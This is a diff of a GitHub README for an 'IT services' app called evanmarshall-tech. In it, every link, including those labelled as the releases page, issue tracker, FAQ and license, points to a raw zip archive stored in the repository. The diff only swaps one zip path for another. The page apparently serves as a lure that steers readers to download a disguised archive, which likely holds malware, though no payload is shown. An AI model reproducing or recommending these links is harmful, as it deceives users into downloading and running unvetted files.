@@ -1,6 +1,6 @@
 # 🚀 evanmarshall-tech - Easy IT Services at Your Fingertips
 
-[![Download Now](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip)
+[![Download Now](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To get started, you'll need to download the application. Follow the steps below:
 
 1. **Visit the Downloads Page:** Click on the link below to go to the Releases page. 
 
-   [Download from Releases Page](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip)
 
 2. **Choose the Latest Version:** On the Releases page, you will see a list of available files. Look for the most recent version and click on it.
 
@@ -55,12 +55,12 @@ If you experience issues while downloading or installing the application, try th
 
 For further assistance, reach out via our support channels:
 
-- **Issue Tracker:** Report issues or request features [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip).
-- **FAQs:** Check our frequently asked questions [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip).
+- **Issue Tracker:** Report issues or request features [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip).
+- **FAQs:** Check our frequently asked questions [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip).
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip).
+This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip).
 
 ## 🌐 Topics
 
@@ -91,4 +91,4 @@ This project covers a range of topics, including:
 
 The evanmarshall-tech application provides a simple solution to your IT needs. By following the steps above, you can easily download, install, and use the application. We hope you enjoy exploring its features! 
 
-[Download from Releases Page](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/docs/images/tech_evanmarshall_3.4.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/omaralqweti/evanmarshall-tech/main/components/evanmarshall_tech_3.7.zip)
